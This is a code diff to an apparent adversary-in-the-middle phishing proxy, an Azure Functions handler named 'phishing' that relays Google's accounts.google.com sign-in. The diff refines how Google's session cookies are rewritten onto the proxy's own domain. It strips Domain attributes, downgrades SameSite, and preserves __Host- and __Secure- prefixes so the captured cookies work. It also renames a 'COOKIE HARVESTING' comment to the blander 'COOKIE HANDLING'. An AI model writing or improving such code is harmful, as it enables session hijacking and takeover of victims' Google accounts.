@@ -149,44 +149,48 @@ app.http("phishing", {
       return original_response;
     }
 
-    // ---------- RESPONSE HEADER STRIPPING ----------
+// Adjust response headers
     const new_response_headers = new Headers(original_response.headers);
     delete_headers.forEach((h) => new_response_headers.delete(h));
-    new_response_headers.set("access-control-allow-origin", "*");
-    new_response_headers.set("access-control-allow-credentials", "true");
 
     // Remove content-length since we're modifying bodies
     new_response_headers.delete("content-length");
     new_response_headers.delete("content-encoding");
 
-    // ---------- COOKIE HARVESTING ----------
+    // ---------- COOKIE HANDLING ----------
     try {
       const originalCookies = original_response.headers.getSetCookie();
       const cookieDomain = original_url.host.split(':')[0]; // Strip port for cookie Domain
 
-      // Rewrite cookie domains from accounts.google.com -> our domain
       originalCookies.forEach((originalCookie) => {
-        // __Host- cookies require no Domain and Path=/ — strip the Domain entirely
-        // __Secure- cookies require Secure flag — we handle them below
         let modifiedCookie = originalCookie
-          .replace(new RegExp(upstream_url.host, "g"), cookieDomain)
+          .replace(new RegExp(upstream_url.host.replace(/\./g, "\\."), "g"), cookieDomain)
           .replace(/Domain=\.google\.com/gi, `Domain=${cookieDomain}`)
           .replace(/Domain=google\.com/gi, `Domain=${cookieDomain}`)
-          .replace(/Domain=accounts\.google\.com/gi, '')
-          .replace(/; ?Domain=[^;]*;/, ';')  // Remove any domain with port that browsers reject
+          .replace(/Domain=accounts\.google\.com/gi, "")
+          .replace(/; ?Domain=[^;]*;/, ";")
           .replace(/SameSite=None/gi, "SameSite=Lax")
           .replace(/SameSite=Strict/gi, "SameSite=Lax");
 
-        // For __Host- cookies: must have Path=/, Secure, and NO Domain
-        if (modifiedCookie.includes('__Host-')) {
-          modifiedCookie = modifiedCookie
-            .replace(/Domain=[^;]+;?/gi, '')  // Strip Domain entirely
-            .replace(/Secure;?/gi, '');        // Strip Secure (may not be HTTPS)
+        // __Host- cookies: must have Path=/, Secure, and NO Domain
+        // Keep Secure (Azure Functions uses HTTPS), strip Domain
+        if (modifiedCookie.includes("__Host-")) {
+          modifiedCookie = modifiedCookie.replace(/Domain=[^;]+;?/gi, "");
+          // Ensure Path=/ exists
+          if (!modifiedCookie.toLowerCase().includes("path=/")) {
+            modifiedCookie = modifiedCookie.replace(/; ?Secure/, "; Path=/; Secure");
+          }
         }
-        // For __Secure- cookies: needs Secure flag — strip it since proxy may not be HTTPS
-        if (modifiedCookie.includes('__Secure-')) {
-          modifiedCookie = modifiedCookie.replace(/Secure/gi, '');
+
+        // __Secure- cookies: must have Secure — keep it
+        // Just ensure no invalid Domain with port
+        if (modifiedCookie.includes("__Secure-")) {
+          modifiedCookie = modifiedCookie.replace(/Domain=[^;]+;?/gi, "");
         }
+
+        // Remove any empty Domain= remnants
+        modifiedCookie = modifiedCookie.replace(/;\s*Domain=;?/gi, ";");
+        modifiedCookie = modifiedCookie.replace(/;\s*Domain=\s*$/gi, "");
 
         new_response_headers.append("Set-Cookie", modifiedCookie);
       });
